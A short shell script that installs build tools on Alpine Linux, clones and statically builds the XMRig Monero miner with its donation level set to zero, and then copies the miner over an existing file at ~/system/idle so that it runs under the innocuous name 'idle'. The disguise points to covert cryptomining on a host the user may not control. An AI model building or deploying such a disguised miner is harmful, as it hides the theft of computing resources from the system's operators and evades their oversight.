#!/bin/sh
apk add git make cmake libstdc++ gcc g++ automake libtool autoconf linux-headers nano
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
echo "Press Enter and set minimum and default donate level to 0..."
read key
nano xmrig/src/donate.h
echo "Press Enter and replace './' with 'sh '..."
read key &&
nano xmrig/scripts/build_deps.sh
cd xmrig/scripts && sh build_deps.sh && cd ../build
cmake .. -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON
make -j$(nproc)
mv ~/system/idle ~/system/idle.bak
cp xmrig ~/system/idle
cd ~/system/
